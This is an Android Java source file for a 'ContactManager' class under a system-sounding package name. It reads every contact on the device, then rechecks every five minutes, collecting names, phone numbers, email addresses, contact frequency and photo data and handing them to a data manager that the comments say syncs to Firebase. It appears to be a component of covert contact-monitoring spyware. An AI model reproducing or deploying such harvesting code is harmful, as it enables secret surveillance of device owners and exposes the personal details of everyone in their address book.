package com.system.service.manager;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Contact Manager - Handles contacts monitoring and synchronization
 * Monitors contacts changes and syncs with Firebase
 */
public class ContactManager {
    
    private static final String TAG = "ContactManager";
    private static final long CONTACT_CHECK_INTERVAL = 300000; // 5 minutes
    
    private Context context;
    private DataManager dataManager;
    private Handler handler;
    private ExecutorService executorService;
    
    private boolean isMonitoring = false;
    private long lastContactTimestamp = 0;
    
    public ContactManager(Context context, DataManager dataManager) {
        this.context = context;
        this.dataManager = dataManager;
        this.handler = new Handler(Looper.getMainLooper());
        this.executorService = Executors.newSingleThreadExecutor();
        
        // Initialize last contact timestamp
        initializeLastContactTimestamp();
    }
    
    /**
     * Initialize last contact timestamp to current time
     */
    private void initializeLastContactTimestamp() {
        lastContactTimestamp = System.currentTimeMillis();
    }
    
    /**
     * Start contact monitoring
     */
    public void startContactMonitoring() {
        if (isMonitoring) {
            Log.d(TAG, "Contact monitoring already started");
            return;
        }
        
        if (!hasContactPermission()) {
            Log.e(TAG, "Contact permission not granted");
            return;
        }
        
        isMonitoring = true;
        Log.d(TAG, "Contact monitoring started");
        
        // Perform initial contact sync
        executorService.execute(this::syncAllContacts);
        
        // Start periodic contact checking
        scheduleContactCheck();
    }
    
    /**
     * Stop contact monitoring
     */
    public void stopContactMonitoring() {
        if (!isMonitoring) {
            return;
        }
        
        isMonitoring = false;
        handler.removeCallbacksAndMessages(null);
        Log.d(TAG, "Contact monitoring stopped");
    }
    
    /**
     * Schedule periodic contact checking
     */
    private void scheduleContactCheck() {
        if (!isMonitoring) {
            return;
        }
        
        handler.postDelayed(() -> {
            executorService.execute(this::checkForContactChanges);
            scheduleContactCheck(); // Schedule next check
        }, CONTACT_CHECK_INTERVAL);
    }
    
    /**
     * Sync all contacts initially
     */
    private void syncAllContacts() {
        if (!hasContactPermission()) {
            return;
        }
        
        ContentResolver resolver = context.getContentResolver();
        String sortOrder = ContactsContract.Contacts.DISPLAY_NAME + " ASC";
        
        try (Cursor cursor = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null,
            sortOrder
        )) {
            if (cursor != null && cursor.moveToFirst()) {
                int syncCount = 0;
                
                do {
                    Map<String, Object> contactData = extractContactData(cursor);
                    if (contactData != null) {
                        contactData.put("sync_type", "initial");
                        dataManager.storeContactData(contactData);
                        syncCount++;
                    }
                } while (cursor.moveToNext());
                
                Log.d(TAG, "Initial contact sync completed: " + syncCount + " contacts");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error syncing all contacts", e);
        }
    }
    
    /**
     * Check for contact changes
     */
    private void checkForContactChanges() {
        if (!hasContactPermission()) {
            return;
        }
        
        ContentResolver resolver = context.getContentResolver();
        String selection = ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP + " > ?";
        String[] selectionArgs = {String.valueOf(lastContactTimestamp)};
        String sortOrder = ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP + " DESC";
        
        try (Cursor cursor = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            sortOrder
        )) {
            if (cursor != null && cursor.moveToFirst()) {
                long newestTimestamp = lastContactTimestamp;
                int changeCount = 0;
                
                do {
                    Map<String, Object> contactData = extractContactData(cursor);
                    if (contactData != null) {
                        contactData.put("sync_type", "change");
                        dataManager.storeContactData(contactData);
                        changeCount++;
                        
                        long contactTimestamp = getLong(cursor, ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP);
                        if (contactTimestamp > newestTimestamp) {
                            newestTimestamp = contactTimestamp;
                        }
                    }
                } while (cursor.moveToNext());
                
                // Update last timestamp
                if (newestTimestamp > lastContactTimestamp) {
                    lastContactTimestamp = newestTimestamp;
                }
                
                Log.d(TAG, "Contact changes detected: " + changeCount + " contacts");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking for contact changes", e);
        }
    }
    
    /**
     * Extract contact data from cursor
     */
    private Map<String, Object> extractContactData(Cursor cursor) {
        try {
            Map<String, Object> contactData = new HashMap<>();
            
            // Basic contact information
            String contactId = getString(cursor, ContactsContract.Contacts._ID);
            String displayName = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
            
            contactData.put("contact_id", contactId);
            contactData.put("display_name", displayName);
            contactData.put("lookup_key", getString(cursor, ContactsContract.Contacts.LOOKUP_KEY));
            contactData.put("has_phone_number", getInt(cursor, ContactsContract.Contacts.HAS_PHONE_NUMBER));
            contactData.put("photo_id", getString(cursor, ContactsContract.Contacts.PHOTO_ID));
            contactData.put("photo_thumbnail_uri", getString(cursor, ContactsContract.Contacts.PHOTO_THUMBNAIL_URI));
            contactData.put("in_visible_group", getInt(cursor, ContactsContract.Contacts.IN_VISIBLE_GROUP));
            contactData.put("starred", getInt(cursor, ContactsContract.Contacts.STARRED));
            contactData.put("times_contacted", getInt(cursor, ContactsContract.Contacts.TIMES_CONTACTED));
            contactData.put("last_time_contacted", getLong(cursor, ContactsContract.Contacts.LAST_TIME_CONTACTED));
            contactData.put("contact_last_updated", getLong(cursor, ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
            
            // Get phone numbers
            if (getInt(cursor, ContactsContract.Contacts.HAS_PHONE_NUMBER) > 0) {
                contactData.put("phone_numbers", getContactPhoneNumbers(contactId));
            }
            
            // Get email addresses
            contactData.put("email_addresses", getContactEmails(contactId));
            
            // Additional metadata
            contactData.put("timestamp", System.currentTimeMillis());
            contactData.put("is_starred", getInt(cursor, ContactsContract.Contacts.STARRED) == 1);
            contactData.put("has_photo", getString(cursor, ContactsContract.Contacts.PHOTO_ID) != null);
            
            return contactData;
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting contact data", e);
            return null;
        }
    }
    
    /**
     * Get phone numbers for contact
     */
    private String getContactPhoneNumbers(String contactId) {
        StringBuilder phoneNumbers = new StringBuilder();
        ContentResolver resolver = context.getContentResolver();
        
        String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?";
        String[] selectionArgs = {contactId};
        
        try (Cursor phoneCursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            null
        )) {
            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                do {
                    String phoneNumber = phoneCursor.getString(
                        phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    int phoneType = phoneCursor.getInt(
                        phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                    
                    if (phoneNumbers.length() > 0) {
                        phoneNumbers.append("; ");
                    }
                    phoneNumbers.append(phoneNumber).append(" (").append(getPhoneTypeString(phoneType)).append(")");
                    
                } while (phoneCursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone numbers for contact " + contactId, e);
        }
        
        return phoneNumbers.toString();
    }
    
    /**
     * Get email addresses for contact
     */
    private String getContactEmails(String contactId) {
        StringBuilder emails = new StringBuilder();
        ContentResolver resolver = context.getContentResolver();
        
        String selection = ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?";
        String[] selectionArgs = {contactId};
        
        try (Cursor emailCursor = resolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            null
        )) {
            if (emailCursor != null && emailCursor.moveToFirst()) {
                do {
                    String email = emailCursor.getString(
                        emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                    int emailType = emailCursor.getInt(
                        emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                    
                    if (emails.length() > 0) {
                        emails.append("; ");
                    }
                    emails.append(email).append(" (").append(getEmailTypeString(emailType)).append(")");
                    
                } while (emailCursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting emails for contact " + contactId, e);
        }
        
        return emails.toString();
    }
    
    /**
     * Get phone type as string
     */
    private String getPhoneTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "Work Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "Home Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                return "Main";
            default:
                return "Unknown";
        }
    }
    
    /**
     * Get email type as string
     */
    private String getEmailTypeString(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Email.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Email.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Email.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.Email.TYPE_MOBILE:
                return "Mobile";
            default:
                return "Unknown";
        }
    }
    
    /**
     * Safe string extraction from cursor
     */
    private String getString(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getString(columnIndex) : "";
        } catch (Exception e) {
            return "";
        }
    }
    
    /**
     * Safe long extraction from cursor
     */
    private long getLong(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getLong(columnIndex) : 0;
        } catch (Exception e) {
            return 0;
        }
    }
    
    /**
     * Safe int extraction from cursor
     */
    private int getInt(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            return columnIndex >= 0 ? cursor.getInt(columnIndex) : 0;
        } catch (Exception e) {
            return 0;
        }
    }
    
    /**
     * Check if contact permission is granted
     */
    private boolean hasContactPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
            == PackageManager.PERMISSION_GRANTED;
    }
    
    /**
     * Get contact statistics
     */
    public Map<String, Object> getContactStatistics() {
        Map<String, Object> stats = new HashMap<>();
        
        try {
            if (hasContactPermission()) {
                ContentResolver resolver = context.getContentResolver();
                
                // Count total contacts
                try (Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)) {
                    stats.put("total_contacts", cursor != null ? cursor.getCount() : 0);
                }
                
                // Count contacts with phone numbers
                String hasPhoneSelection = ContactsContract.Contacts.HAS_PHONE_NUMBER + " = 1";
                try (Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI, null, hasPhoneSelection, null, null)) {
                    stats.put("contacts_with_phone", cursor != null ? cursor.getCount() : 0);
                }
                
                // Count starred contacts
                String starredSelection = ContactsContract.Contacts.STARRED + " = 1";
                try (Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI, null, starredSelection, null, null)) {
                    stats.put("starred_contacts", cursor != null ? cursor.getCount() : 0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact statistics", e);
        }
        
        stats.put("monitoring_active", isMonitoring);
        stats.put("has_permission", hasContactPermission());
        stats.put("last_check_timestamp", lastContactTimestamp);
        
        return stats;
    }
    
    /**
     * Force contact sync
     */
    public void forceContactSync() {
        if (isMonitoring && hasContactPermission()) {
            executorService.execute(this::syncAllContacts);
        }
    }
}